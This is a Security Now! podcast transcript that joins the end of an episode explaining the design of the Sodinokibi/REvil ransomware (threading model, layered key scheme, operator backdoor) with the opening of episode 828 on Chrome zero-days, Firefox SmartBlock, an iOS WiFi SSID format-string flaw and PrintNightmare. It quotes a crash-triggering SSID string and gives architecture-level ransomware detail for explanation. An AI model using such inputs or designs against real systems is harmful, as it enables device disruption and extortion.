They said:  "The user function AddFileToIoCompletionPort also generates a unique Salsa20 key for each file that is to be encrypted, and passes this Salsa20 key to the encrypting thread as part of the structure containing other metadata that has to be written to the file as well after encryption using lp" - that's long pointer - "lpOverlapped parameter of PostQueuedCompletionStatus Windows API.  During enumeration, it also creates a random note file in all folders that are not in the exempted folder list.  Once there are no more files to enumerate, the main thread waits in a loop until the total number of files encrypted and renamed equals the total number of files added to the I/O completion port for encryption."



Last sentence here:  "Finally, it sets a flag which indicates that there are no more files to enumerate and posts multiple I/O completion packets.  By doing this it makes sure that extra threads waiting for files should resume and break the execution flow to finish immediately."  Okay, now...



MIKAH:  Simple.



STEVE:  I've been programming Windows for several decades.  And as we all know, I write in assembly language at the Windows API level.  What I just read not only makes perfect sense to me, but it is precisely the optimal maximum performance multi-threaded design for working with any large collection of objects under the Windows API.  And in fact this is precisely the design I use to manage all of GRC's web server side services where a lot of stuff needs to be going on at the same time.



So what I read, all that gobbledygook, amounts to using a low-level native Windows API to create a queue of file encryption jobs which actually exists in the kernel and will be serviced by a pool of processor core threads.  The reason this is so efficient is that jobs are removed from the queue explicitly avoiding expensive thread context switches.  Typical queues would wind up by assigning jobs to threads in a round-robin fashion where the longest waiting thread would get assigned the next task.  But Windows' completion port design, first of all, it's kernel based, so it involves ring 3 to ring 0 transition delays.  And it deliberately is designed to allow the same thread that's executing at the time and is posting its completion status to obtain the next job of work on the queue, and to begin working on it immediately without using its scheduling time slice.



So to put this into context, for their application, it's over designed.  It's a small matter.  In the case of Sodinokibi, where the individual jobs will be comparatively large and long-running compared to a threat context switch, just the context-switching overhead would be undetectable.  But what this showed me was that whoever wrote this piece of code, they really knew their way around the Windows API.  They weren't taking shortcuts.  It wasn't written in some high-level abstraction.  They knew exactly what they were doing and how to do it.



So with that preamble, let's talk about the crypto.  When interviewed, a member of the REvil gang expressed their extreme pride in their creation of Sodinokibi.  As a researcher commented, this pride was warranted because Sodinokibi is one of the few ransomware families that actually thought about its cryptographic scheme and how to account for all various situations.



Okay.  So there are four applications of and types or instances of public/private key pairs used by Sodinokibi, as follows:  There's an operator key pair whose public half is hardcoded and built into every Sodinokibi code sample that has been obtained.  This value is set by the REvil operators themselves, the REvil gang, and cannot be set or changed by an affiliate.  So in other words, there's an operator public/private key pair, the public component, the public half of which is built into an affiliate's code, which the affiliate then goes out and does evil with.  The private key is maintained by REvil and is kept secret.



Okay.  There's also a campaign key pair whose public half is stored as the PK value, as it's called, in Sodinokibi's per-victim or per-campaign configuration, depending upon the application.  This value can be modified by the affiliate.  So the campaign key pair, again, the public component is like per-configuration.  The affiliate keeps the private key, the private half of the campaign key pair, as their secret, much as the REvil gang keeps the operator, the private operator half of their secret.



Then there's a system-specific key pair, that is, like a machine-specific key pair, that's generated as an individual system is being encrypted.  The private half of that key pair is encrypted in parallel, as opposed to in series.  The private half of that key pair is encrypted using both the operator's public key pair, or public half of its key, which is built into the code, and the campaign's public key, which is in the campaign's configuration.  And lastly, there's a unique per-file key pair which is individually generated...



MIKAH:  Oh, my word.



STEVE:  ...individually generated for each encrypted file, separately.  The public half of the per-file key pair is stored in plaintext within the Sodinokibi file header that's appended to the front of the encrypted file content.



Okay.  So, now, here's where things get really cool.  Bulk file encryption is, as Kaspersky alluded to, performed using Dan Bernstein's excellent and quite fast Salsa20 symmetric cipher.  The symmetric cipher, which will be used for both the encryption and maybe, if you pay the ransom, the decryption, is obtained by combining the private half of the per-file key pair, which they didn't say it, but I know it because I did the same thing in SQRL, you actually discard this.  You combine the private half of the per-file key pair with the public key - my notes are jumbled here because I know what I meant, but I didn't write it.



So the symmetric key is obtained using ECDH, which is the Elliptic Curve Diffie-Hellman algorithm, the Elliptic Curve Diffie-Hellman key agreement, under Curve25519, which is the same one I used.  The idea with Diffie-Hellman is that, just to remind people, is you can have two people distant from each other.  They each create a private and public key, that is, a private and public key pair.  They each send to the other the public side of their pair.  And upon receiving it, they each take the other person's public half and their private half, run it through Elliptic Curve Diffie-Hellman, each of them, and they get the same result.  So this is what's so cool is that it's amazing because...



MIKAH:  How does that work?



STEVE:  I know.  It's math, baby.  And what's so cool is that a man in the middle, somebody eavesdropping, even the NSA, all they see is each of their public keys passing, and they don't ever get, no observer gets the private side.  So both public keys tell you nothing.  It's only by combining the matching private key with the other person's public key that you're able to get a result.  And what's so cool is you both get the same result.  So this is the application of that for communication.  It turns out you can use it for encryption.  And I did that in SQRL.  I did exactly the same thing in SQRL.  So with Sodinokibi, they take the private half of the per-file key pair with the public half of the system key, combine those using Elliptic Curve Diffie-Hellman to get the symmetric key which will be used to encrypt the file using Salsa20.



Okay.  So the key takeaway here - ignore the pun - is that only the private half of the system key is required to decrypt every file for that system because you can reverse this, essentially.  Each file to be decrypted provides its public key, which was in its header, along with the private side of the system key.  That's like the other side of this conversation.  When those are combined, you get the same symmetric key as was obtained for encryption.  And since it's the same symmetric key, and since it's symmetric, that key will do decryption.  And so the other property this has is that every single file that's encrypted under Sodinokibi is encrypted with a different and unique symmetric key.  So the file level of granularity would allow somebody to provide one decryption key for one file, and that decryption key could not be used anywhere else.  It's completely unique to that one file.



So now the question is, since we needed the private side of the system key, how do we get that?  Recall that the private half of the system key was encrypted separately using the public halves of both the operator's and the campaign's keys.  This means that the private half of either the operator's or the campaign's key can be used to decrypt the system key.  Since the public half of the operator key is embedded in the Sodinokibi code, which is individualized per affiliate and cannot be changed by the affiliate, this is what provides the REvil operators with a per-affiliate backdoor into Sodinokibi, enabling them to unilaterally decrypt anything that any of their software is ever used to encrypt.  So this provides the REvil operators with protection against any rogue affiliate who might violate their rules in some fashion.



And both of these approaches would decrypt an entire campaign.  That is, either the use of the operator's private key or the campaign private key can decrypt the entire campaign.  Yeah, exactly.  We saw with the Kaseya attack that the attacking affiliate was offering to decrypt individual systems for the bargain price of only $45,000 in bitcoin.  The way this would be done would be done would be by distributing a decryptor, giving someone you had attacked a decryptor that only contains a specific system's previously decrypted private key.  That allows them to combine that private key with all of that system's files per-file public key which is in the header of every encrypted file, use Diffie-Hellman to obtain the symmetric Salsa20 key, and you decrypt the file.



So without an explanation like what I've just provided, a flowchart of Sodinokibi's cryptographic operations is quite daunting.  And in fact, even with - now it's on the screen.  Get ready, folks.  Even with that careful explanation, Sodinokibi's design can be a bit overwhelming, as we can see in the diagram below.  I stared at it.  I understand every arrow.  There is not a single thing there that is not there for a reason and that does not provide some functionality.  So I've often said on the podcast that with the cryptographic tools we now have at our disposal as a bit of a toolkit, you can pretty much do anything you want.  And these guys are unfortunately a malicious example of creating a very sophisticated, very capable facility.



So the bottom line is that whoever developed this beast several years ago - it first appeared in 2019 - really thought the problem all the way through.  Unlike many of the less professionally designed, half-baked ransomware systems that we've seen, like where you can easily get a decryptor after analyzing the software, it's like, oh, they used the key My Bananas Are Yellow.  So that's not going to be hard to decrypt.  Unlike that, these guys did not make any mistakes that would allow for short-circuiting the need to pay for decryption.  And in the process they have created, unfortunately, a powerful and a very efficient file-encrypting system.



MIKAH:  All right.  I have a question, then.



STEVE:  Yeah.



MIKAH:  So in a broad sense I'm understanding what you're saying.  Obviously not the nitty-gritty details here.  But one of the things that you mentioned is that each individual, you know, it goes as far as each individual file is encrypted.  So then say REvil comes after me, and they get me, and I give them the bitcoin that they ask for.  Are they going to pass me encryption keys or decryption keys for every single individual file?  Are they going to pass me a program that decrypts my stuff?  Are they going to decrypt it for me and let me re-download it?  How does the actual process work to return my files to the way that they were before?  If every single file is encrypted, do I have to have a key for every single one of those now?



STEVE:  Okay.  So what happens is you would pay the ransom.  They would know who you are because you would have been a campaign.  You would be at the campaign level that you were working with them.  Either the affiliate who was probably the person who attacked you, or REvil, if like the affiliate went belly-up or disappeared or something, either of those two people hold a private key that will decrypt the private key in your system.  So, okay.  So that's the first thing is your system has a key, but it doesn't do you any good because it's encrypted in a way you can't decrypt it.



MIKAH:  Oh, okay.



STEVE:  So they will decrypt that.  And then they provide you with a decryption tool.  The key to your question is that in front of your files that are encrypted is a header.  So Sodinokibi adds a little header, doesn't have to be big, it's probably 256 bytes or something.  In that is the per-file data that doesn't let you decrypt it unless you have the decrypted system key.



MIKAH:  Okay.



STEVE:  So the decrypted system key plus the per-file header provides the per-file decryption key to decrypt that file.



MIKAH:  And so it's kind of both you get a key that you need to decrypt your system, but then they also give you a program that's going to actually do the process of decrypting all those files...



STEVE:  Yeah, actually they make it a little easier.  They simply give you a program that will do the decryption for you.



MIKAH:  Got it.



STEVE:  Because they've done the work of taking your encrypted system key, decrypting it with their private key, and they then build that into a little program and say, here you go.  Just turn this loose, and it'll fix you.  And presumably it recurses through your entire directory tree in the same way and takes the header off of the front of each file, performs the elliptic curve crypto to obtain the Salsa20 key, the same one that was originally used to encrypt it, reapplies it to decrypt it, and you get your file back.



MIKAH:  All right.  That makes sense.



STEVE:  And then the last little piece, since I thought our listeners would appreciate having this, Acronis reverse engineered the exempted folders, exempted files, and exempted file extensions which Sodinokibi will not touch.  And it's at the bottom of the show notes.  It's on the screen right now.  Anybody who's interested can grab the show notes.  The last page of the show notes has the list of folders that they don't go into, the list of files that they never encrypt, and the file extensions that they don't bother encrypting just because they're not, you know, it's like .bin, .hlp, .drv, .bat, .msc, .lnk, .cab, those things, you know, that are not valuable user content.  There's things you could get, for example, from another system, so why bother taking their time, slowing down.  And, by the way, there's a gazillion of those, right, .nls, .sys, .dll.  Oh, my god.



So they want to skip decrypting stuff that they don't need to because they want to get the stuff they do need encrypted, encrypted as quickly as they can.  So it's not like they're doing us a favor by leaving a bunch of stuff unencrypted.  It's just there's no point because that stuff is all readily replaceable from another machine.



MIKAH:  And part of the reason for that efficiency you were talking about earlier, working at the low level, is so that they can do it before they're detected?  Is that the point of that?



STEVE:  Right.



MIKAH:  So you wouldn't even notice your fans spinning up on your system as it's doing this encryption in the background?



STEVE:  Right.  And in fact, what everyone is told, like when the first instant that ransomware is detected in a company, like an emergency broadcast is set, like unplug your computer now.  We don't care what you're doing, pull the plug now.  It's just like, to just stop it from spreading or going any further.



MIKAH:  That makes sense.  All right.  Well, it was complicated, but we got there in the end.  



STEVE:  Yeah.  I think it made sense.



MIKAH:  It does, it does.  I'll have to read it about 15 more times to truly grasp it, but I'm glad you...



STEVE:  There'll be no test on this.



MIKAH:  Oh, good.  Okay, good.  Whew.  Thank goodness.  Well, I think that brings us to the end of this episode of Security Now!; right?



STEVE:  Yup.



MIKAH:  All right.  Well, of course, Steve, thank you for all of your awesome work on this show.  Folks can tune in live every Tuesday at 4:30 p.m. Eastern, 1:30 p.m. Pacific, 20:30 UTC to watch the show record live.  Or you can go to TWiT.tv/sn where you can subscribe to the show on Apple Podcasts, Google Podcasts, Pocket Casts, Spotify, all the places.  We try to be in those places, as well, so you can learn about the next PrintNightmare when it pops up.  I don't know, does Leo usually - you've got anything you need to plug or want to talk about?



STEVE:  No, we're good.



MIKAH:  All right.  Well, then, that does it.  And thanks for having me join you this week.  Appreciate it.



STEVE:  I'm glad to have you fill in.  Thanks so much, Mikah.  Bye.



MIKAH:  Bye-bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#828

DATE:		July 20, 2021

TITLE:		REvil Vanishes!

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-828.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at the continuing attacks on Chrome with yet another zero-day and at Mozilla's continuing work to give their users the most privacy possible.  We reexamine that iOS WiFi SSID bug and a related bug which, it turns out, Apple apparently knew was a showstopper.  Amazingly, two more new problems have surfaced with Microsoft printer technology.  We have a review of last week's Patch Tuesday including the importance of also updating any instances of Adobe's Acrobat and Reader.  We revisit an old friend and consider the folly of rolling one's own crypto.  We look at the explosive revelations surrounding the widespread abuse of iPhone and Android "surveillance-ware" produced by the NSO Group.  And finally, after sharing one fun piece of errata, we're going to finish by examining the curious, sudden, complete and total disappearance of the REvil ransomware organization.



SHOW TEASE:  It's time for Security Now!.  I'm back.  Steve Gibson's here.  More Chrome zero-days.  A revisit to the SSID flaw in iOS and how it happened and how it wasn't fixed.  And yes, the PrintNightmare is back, baby.  All that and more coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 828, recorded Tuesday, July 20th, 2021:  REvil Vanishes.



It's time for Security Now!, the show where we cover the latest security news, information on how to keep you safe, how things work, with a very hot Steve Gibson.



STEVE GIBSON:  Coming to you from the alternative location, under the air conditioning, I'm happy to say.  The air is pouring right down on me.  I had a, after 37 years, actually I think this is the third air conditioner I'm on since I purchased my home in '84 and found a great Southern California air conditioning firm.  I'll give them a free plug, Rohan and Sons, for anyone who's in Southern California.  They are...



LEO:  Nice.  By now it's got to be the son that comes over.



STEVE:  Actually, I think Dad's wandered off since then.  That was, you know, 37 years ago.



LEO:  Yeah, I'm thinking he's retired by now.



STEVE:  And they're just, in fact, it was so inexpensive - they recharged my Freon February a year ago, before COVID - that I felt badly that he, like, charged me 20 bucks.  And so I gave him a hundred dollar bill just because it's like, come on, that's just ridiculous.  He came out with all of his equipment  and figured out what was going on and everything.  So anyway, they are great.  But anyway, so I believe the control relay died since there's nothing happening on the outside of the system.  So I did all the podcast prep and production and everything, and it was 88 degrees in my office a couple hours ago, and I had already told Lorrie that I had a feeling I'd be seeing her a little bit after noon today.  And so I brought my traveling road show with my Heil getup and my mic and everything.



LEO:  You must be something getting out of the car with all that stuff under your arm.  That's funny.



STEVE:  But anyway, we've got a bunch of fun stuff to talk about, a bunch of fun stuff for this 828th podcast.  We're going to look at the continuing attacks on Chrome with yet another zero-day, and on Mozilla's continuing work to give their users the most privacy possible.  They really are sort of forging the path on that.  We're going to reexamine that iOS WiFi SSID bug.  Remember the print format string.



LEO:  Oh, yeah, yeah, that came back.



STEVE:  Turns out it - yeah, yeah, yeah.  And apparently Apple knew more about it than we did before, even, and it was a showstopper.  Amazingly, we have two more new problems which have surfaced with Microsoft's printer technology.



LEO:  Can you believe that?  What is that, five now total?



STEVE:  Yeah, I mean, what's happening now is as I'm, like, tracking down the news, I'm having to make sure I'm not, like, repeating them because it's - and I've seen people tweeting, like security researchers, we're having trouble keeping track of this.  I's just crazy.



LEO:  Wow.



STEVE:  We've also got a review of last week's quite busy Patch Tuesday, including the importance of also updating any instances that you may have of probably Adobe's Reader, but it also affects Acrobat.  We're going to revisit an old friend and consider the folly of rolling one's own crypto.  And we look at the explosive revelation surrounding the widespread abuse of iPhone and Android surveillance-ware produced by the NSO Group.  I know you guys talked about it on MacBreak Weekly.  And, finally, after sharing one fun piece of errata which surfaced after something I said last week, we're going to finish by examining the curious, sudden, complete and total disappearance of the REvil ransomware organization.



LEO:  Curious.



STEVE:  Thus the title of today's podcast, REvil Vanishes.  And we do have a really - this is just - this warms my heart, the cockles, our Picture of the Week.  So I think another great podcast.



LEO:  Very nice.  Very nice.



STEVE:  Picture of the Week.



LEO:  Yes.



STEVE:  It just really, as I said, warmed my heart.  We're looking at the top of page 342, Chapter 8, titled "Principles of Security Models, Design, and Capabilities.  This is the official CISSP "Certified Information Systems Security Professional" study guide.  And the discussion we see from the page, it says:  "However, when the speculative execution is wrong, the procedure is not completely reversed, i.e., not every incorrect predicted step is undone.  This can result in some data remnants being left behind in memory in an unprotected state."  Then it talks about, in the next paragraph:  "Meltdown is an exploitation that can allow for the reading of private kernel memory," blah blah blah.



It finishes all this, and then this callout finishes, saying:  "For a thorough discussion of these concerns, please listen to the Security Now! podcast or read the show notes of episodes 645, "The Speculation Meltdown"; 646, "InSpectre"; 648, "Post Spectre"; 662, "Spectre NextGen," at www...



LEO:  We did a lot of Spectring.



STEVE:  Yeah, well, that was the big news of that year.  So at www.grc.com, blah blah.  Anyway, Chapter 8, Official CISSP certification study guide.  So, yeah, we're...



LEO:  You're famous, Steve.  I could get you $60 million now from Spotify.



STEVE:  And a thank you to Chuck Littlefield for taking the picture and sharing it with me through Twitter.  I appreciate it, Chuck.  Very cool.



So the attacks on Chrome continue.  Google has released 91 blah blah blah dot 164 for Windows, Mac, and Linux, which fixes seven security vulnerabilities, one of them a high-severity zero-day being actively exploited in the wild.  Of that one, which was a CVE ending in 30563, Google said that it's aware of reports that an exploit exists in the wild.  And as usual, Chrome will eventually auto-update, I suppose.  But every time I check, I catch it off-guard.  When I checked last night, I was still running .124, you know, 91 blah blah blah .124, rather than .164.  So the act of checking, going to setting Help About Google Chrome, triggered its update.  And after a restart I was then current.



And we are keeping score here.  This CVE, 30563, brings the total count of exploited-in-the-wild critical zero-day flaws patched so far this year to eight.  So a little better than one a month.  It's been a rough year so far.  This one was another type confusion bug in Chrome's V8 engine, which as we know is their high-performance WebAssembly and JavaScript processing subsystem.



One little tidbit was particularly interesting.  Google stated that, based upon their analysis - of what they didn't say - two of those eight zero-days, 21166 and 30551, those are both previous this year, had been developed and sold by the same vendor providing surveillance capabilities to customers around the world.  Okay.



So then last Thursday, Microsoft and Citizen Lab linked the vendor mentioned by Google's Threat Analysis Group, that's their TAG group, as the Israeli spyware vendor Candiru, C-A-N-D-I-R-U.  It's believed that threat actors deployed Candiru's surveillance spyware to infect iOS, Android, macOS, and Windows devices using Chrome zero-days and unpatched Windows flaws - there were also some flaws in IE - in order to get into their systems.  So clearly Google is doing everything that they can.  And what we are seeing, well, we're seeing many different things.  In this case we're seeing that because today's systems are so complex, despite full focus on making them as secure as they can, we're still seeing bad guys discovering zero-days.  And boy, are we going to be talking about that a little bit later.



Also in the browser front, Firefox has special-cased anti-tracking for those "Login With" functions, you know, Login With Google, Login With Facebook, sometimes it's Connect with Facebook.  When Firefox's full anti-tracking protections, which they've been working on and we've been reporting on, are enabled under Firefox's strongest privacy-protecting incognito browsing mode, those increasingly popular logon-with-some-other-site features, which is accomplished with scripts that can inherently also be used for tracking, they don't work because the protection is too strong, or as strong as it needs to be.  And that was causing trouble.  So the just-released Firefox 90 - and once again I was running 89, and so I said, uh-oh, and restarted, did the what-about and got 90.  90 resolves this dilemma.



So here's what Mozilla explained, naturally with a bit of a sales pitch spun into this.  They said: "Today, with the launch of Firefox 90, we are excited to announce a new version of SmartBlock, our advanced tracker blocking mechanism built into Firefox Private Browsing and Strict Mode.  SmartBlock 2.0 combines a great web browsing experience with robust privacy protection by ensuring that you can still use third-party Facebook login buttons to sign into websites, while providing strong defenses against cross-site tracking.



"Logging into websites," they say, "is of course a critical piece of functionality.  For example, many people value the convenience of being able to use Facebook to sign up for and log into a website.  However, Firefox Private Browsing blocks Facebook scripts by default."  Yay.  You know, it should.  They said:  "That's because our partner Disconnect includes Facebook domains on their list of known trackers."  Again, yes, they should.



So they said:  "Historically, when Facebook scripts were blocked, those logins would no longer work.  For instance, if you visit Etsy.com in a Private Browsing window, the front page gives the following options to sign in, including a button to sign in using Facebook's login service."  Which of course we all know is OAuth.  They said:  "If you click on the Enhanced Tracking Protection shield in the address bar," you know, while you're at Etsy, and click on Tracking Content, you will see that Firefox has automatically blocked third-party tracking content from Facebook to prevent any possible tracking of you by Facebook on that page.  Prior to 90" - that is, this most recent released Firefox - "if you were using a Private Browsing window, when you clicked on the 'Continue with Facebook' button to sign in, the sign-in would fail to proceed because," they wrote, "the third-party Facebook script required had been blocked.



"Now, SmartBlock 2.0 in Firefox 90 eliminates this login problem."  Okay, albeit at some [audio glitch] privacy; right?  Because you can't have both, unfortunately, with OAuth.  They said:  "Initially, Facebook scripts are all blocked, just as before, ensuring your privacy is preserved.  But when you click on the 'Continue with Facebook' button to sign in, SmartBlock 2.0 reacts by unblocking the Facebook login script just in time for the sign-in to proceed smoothly.  When this script gets loaded, you can see that unblocking indicated in the list of blocked tracking content."  In other words, it's no longer present as being blocked. 



"SmartBlock 2.0 provides this new capability on numerous websites.  On all websites where you haven't signed in, Firefox continues to block scripts from Facebook that would otherwise be able to track you.  You don't have to choose between being protected from tracking or using Facebook to sign in."  Well, of course, until you actually do.  "Thanks to Firefox SmartBlock," they finish, "you can have your cake and eat it, too."



So, okay.  It's obvious to anyone why sign-in with Google or Facebook are compelling offers to the typical user.  Right?  They have no way of appreciating, or maybe they don't care, that Google and Facebook gleefully offer these sign-in services because the user's browser is being, I mean, in exactly this way that Firefox has just said, okay, we're going to conditionally drop our guard, right, because we have no choice.  So users have no way of knowing that Facebook and Google are gleefully offering these services because a user's browser is being redirected through them, allowing them to statically tag the user's browser with an identifying first-party cookie which is about as non-anonymous as anything could be since the user is using their Google or Facebook identity as their surrogate login identity.  And not to mention that the surrogate also knows where they have just logged into.



So, you know, I think it's very cool that, in the first place, Firefox's browsing privacy protections are strong enough that this clearly privacy-bypassing process was blocked even to the inconvenience of those users because they desired strong privacy.  And private is one thing that OAuth is not.  And I also think it's exactly right that Mozilla then stepped up and opened just the tiniest of all possible privacy exemptions or exception windows to allow the indirect login flow to succeed.



So, yeah, I say Bravo to Mozilla for their execution of this.  That doesn't make OAuth any better, but we're currently living in a land of significant convenience versus privacy tradeoffs.  And what they've done is they've kept from breaking functionality, which might cause users not to use in-private browsing, not to use Firefox because they think it's broken.  And they want to use their login convenience, yet just open the tiniest little window to allow the OAuth browser flow to succeed.



So again, not the ideal solution.  The ideal solution would be something that is, well, we all know that I spent seven years working on, that is 100% private because it's a two-party login, not a three-party login, as OAuth is.  But we don't have SQRL, so we have convenience with a little tiny bit of privacy sacrifice.  And, you know, again, probably no one really cares.



Okay.  Oh, wow.  iOS WiFi SSID bug.  I think it's worth reinforcing first the critical security principle Bruce Schneier captured when he wrote that:  "Attacks always get better.  They never get worse."  Okay.  Recall last month Apple iOS WiFi SSID bug that we had fun talking about.  That was the one security researcher Carl Schou tweeted:  "After joining my personal WiFi with the SSID '%p%s%s%s%s%n,' my iPhone permanently disabled its WiFi functionality.  Neither rebooting nor changing SSID fixes it."  And of course that led to the discovery that they had not sanitized the SSID string prior to presenting it to a function, you know, some version of printf which was interpreting those percent things as things to be expanded and looking for parameters on the stack or from the caller that weren't there, thus causing a crash.  And the concern was, as Bruce points out, attacks always get better.  So maybe this could be leveraged into such an attack.



Now, we talked about the inherent danger of what is an incredibly convenient shortcut that exists in many programming languages, that is, lots of languages do this.  One of this podcast's other observations is the danger inherent in interpreters; right?  We're always talking about interpreters.  They're hard to get right.  And what we have here with the percent character escape is an interpreter where the printf function, or one of its cousins, is reading and interpreting the string on the fly, as it encounters it.  No WiFi radio's SSID should contain interpretable percent sign escape sequences.  The bug that was discovered in iOS was that SSIDs, which are in this case attacker-controlled, were not being sanitized by first doubling-up all percent characters into percent percent pairs, which would then be treated as a single literal percent without any special interpretation.



And the reason we're talking about this again and reminding everyone about Bruce Schneier's pithy observation is that yes, indeed, that flaw or actually a slight variation turned out to have been weaponizable.  After studying the trouble and verifying that it's much worse than we were told, security researchers with ZecOps, Z-E-C-O-P-S, have nicknamed the issue "WiFi Demon," discovering a zero-click drive-by vulnerability that allows an attacker who controls a nearby WiFi hotspot to infect an iOS device without any user interaction, when the iOS device has its default setting for WiFi to automatically join WiFi networks.  Even if they're not joined, just the act of sniffing the maliciously crafted WiFi SSI beacon is all that's required.



Okay, now, I used the phrase "much worse than we were told" because Apple was apparently aware of this, and elected not to tell anyone. 



LEO:  Oh.



STEVE:  Even after the fact.  Yes.



LEO:  So there was a little conversation, I don't know if you heard it on MacBreak Weekly, saying, well, these guys should have followed normal disclosure policies and sent the exploit to Apple.  But that's not what - that wasn't the problem.  Apple knew already.



STEVE:  Well, Apple knew and silently fixed it.  The flaw was introduced with the release of iOS 14.0 last September.



LEO:  This is just the latest flaw, by the way.  There have been serial flaws that NSO has been using.



STEVE:  Oh, yeah, yeah, yeah.  So we're just talking about one of these.  And it's not clear that this one would have been weaponizable for the NSO Group's purpose because this is strictly local.  You have to be...



LEO:  Oh, yeah, yeah.



STEVE:  You have to present a WiFi beacon to iOS.



LEO:  Oh, I remember that, yeah, yeah.



STEVE:  In order for this one to get it.  But Leo, wait till you hear what this is.  So this popped into existence last September with the release of iOS 14.0.  Apple quietly patched the issue in January this year as part of their iOS 14.4 update.  So this hasn't actually been a problem for a while.



LEO:  Right.



STEVE:  That SSID string which Carl found, that will be fixed.  We're still living with it.  It's going to be fixed in 14.7.



LEO:  Okay, that came out today.



STEVE:  Oh, just, okay, just came out.



LEO:  Just came out.



STEVE:  Okay.  Okay.



LEO:  This is hysterical.



STEVE:  Apple never made any mention of it, nor did they bother assigning a CVE identifier to the flaw.  Okay.  As we know, the 14.4 update did not fully fix all the problems, since Carl Schou's discovery of that wacky SSID is still workable, or was until today.  But it was yesterday under iOS 14.6.  It has now been finally fixed, finally, fully, in today's iOS 14.7 update, which when I wrote the show notes was undergoing final prerelease beta testing.  So how do we know that Apple knew, and this dangerous WiFi SSID remote code execution vulnerability didn't just coincidentally disappear on its own?  You know, that could have happened.  We know this because of what Apple quietly removed to fix the trouble.



We've talked about the inherent trouble with percent escapes.  Well, until iOS 14.4, right, in January, another incredibly dangerous escape sequence was being honored, %@.  In Objective C, the %@ escape instructs the interpreter that the associated parameter is a pointer to an Objective C object, which should be printed.  So lord only knows what sort of wild goose chase of interpretation would have ensued if this was encountered, if %@ was encountered in an SSID.  And actually we do know what sort of wild goose chase would ensue since the ZecOps researchers wrestled this beast to the ground and positively verified that until the interpretation of the %@ was silently removed by Apple at the beginning of the year, it was definitely possible to trigger an attacker-controlled remote code execution.



But now think about it.  This raises an even greater issue.  Which is worrisomely similar to Microsoft's failure to fully patch the PrintNightmare flaw the first time, and instead, as we discussed, only patching to fix the provided proof of concept demonstration of the flaw.  Here's my concern in the case of Apple.  Someone at Apple was apparently tasked with removing the handling of %@ from an attacker controllable string, in this instance a WiFi SSID.



But they left all of the other percent escape sequence interpretation in place, none of which should ever happen on an SSID, and once again only repaired one specific instance of the actual bigger problem, which was looking at them in the face, rather than seeing the forest and realizing, uh-oh, hold on a second, why exactly are we interpreting any percent escape sequences in this part of the code?  You know, it should have been fixed in January.  It wasn't.  Carl found it, and we've been living with other instances of percent escape problems until finally, with 14.7, they fixed it.



So, you know, if this is indicative of a larger emerging trend in our industry, then Leo, this podcast is going to require six digits for its episode numbering.



LEO:  So this is the second time we've talked about a patch only fixing one immediate part of it - Microsoft did the same thing with the spooler patch - and not the overall problem.



STEVE:  Yes.



LEO:  They should never let any of those strings through, ever.  That's ridiculous. 



STEVE:  No, no.  And so, you know, who knows?  Maybe this was being used in a remote code execution exploit, and so somebody was assigned with, uh-oh, how are they doing it?  Oh, look, they're sending a %@ in a string.  Oh.  Take that out.  We don't need that.  But they should have fixed the problem of interpreting all the other percent escapes.  Ugh.  I don't know.



LEO:  So the speculation was that some renderer gets this, you know, obviously it's not in the deep WiFi code.  It's probably somewhere like the renderer that displays it on your iPhone screen, the name of the SSID, or something like that.



STEVE:  No, except you don't have to have your phone unlocked and showing it.  So it is, I mean, it could be a renderer, like, is assembling a list, which would then be shown if you unlocked your phone. 



LEO:  Right.



STEVE:  But this thing can be in your pocket, locked.



LEO:  Right.  So zero-click.  Those are the worst.



STEVE:  And it'll knock out your WiFi just when the phone sniffs it.  So it is somewhere in some parsing, you know, beacon parsing code somewhere.



LEO:  And the reason I mention it is maybe they wanted to leave some formatting strings in there.  I mean - are you drinking a glass of milk?  Because that's really good.



STEVE:  No, it's a paper wrapper around.



LEO:  Okay.  I was going to, well, I do see your milk moustache, but that's another story, for another day.  No, I think that maybe - I'm looking, making up excuses for them.  But they wanted some formatting capability in these SSIDs being displayed, so they didn't want to take it all out.  I don't know.  There's no excuse.  You're right.



STEVE:  Well, and we know that an SSID, okay, obviously a percent symbol is legal in an SSID. 



LEO:  Right.



STEVE:  I mean, you can do that.  It's crazy, but yeah.  I mean, it would make it harder to brute force, I suppose.  So all you...



LEO:  You escape it, though.  You don't...



STEVE:  So exactly.  Escape it.  That's the solution.  If you want to show them...



LEO:  I mean, that's what you do in general on the web.



STEVE:  Yes.



LEO:  Okay.



STEVE:  Anyway, again, anybody can make a mistake.  I'm not saying that was the problem.  The problem was they didn't fix the problem when it was shown to them.



LEO:  Right.  They fixed a subset.  Yeah.  They fixed a little subset of the problem.



STEVE:  Yeah.



LEO:  It's very strange.



STEVE:  Let's hope they have now.  I mean, lord knows, we don't know if they've fixed it yet.



LEO:  Right.



STEVE: We just know that %n is gone or whatever it was that was decided to be causing the problem.  Boy.  Okay.  So we still, unbelievably, are unable to awaken from the PrintNightmare.  We began last week's podcast while you were wherever you were, Leo.  



LEO:  You have any guesses where I might have been?  Any thoughts at all?



STEVE:  Yeah, I loved the safari hat that you had on for MacBreak Weekly.  Wherever you were, we were observing that Microsoft PrintNightmare was still with us.  And believe it or not, even after last week's Patch Tuesday, which we'll get to next, the nightmare continues.  Reporting all this, as I had mentioned before, has been a bit of a challenge because I've been needing to make sure that I'm not re-reporting something that we've talked about before because it's hard for me to believe we're still coming up with new problems.  There have been so many similar and related problems with discoveries and announcements and patches.  And as I said, I've seen other researchers saying that it's becoming difficult to keep up.



In this latest case, after carefully double-checking, I'm quite certain that we have two more newly discovered problems with Windows printer driver installation being leveraged into an escalation of privilege to system root kernel level.  And one of the things that we discussed last week, and we're actually going to come back to this, is Microsoft explained in their bulletin for the emergency patch, remember when you and I were doing the podcast week before last, during the podcast, Microsoft published the out-of-band, out-of-cycle emergency patch for the PrintNightmare.  We of course later learned that it was different than the one that the previous Patch Tuesday fixed.  And then we learned that it didn't actually solve the problem, that there was a workaround for it.



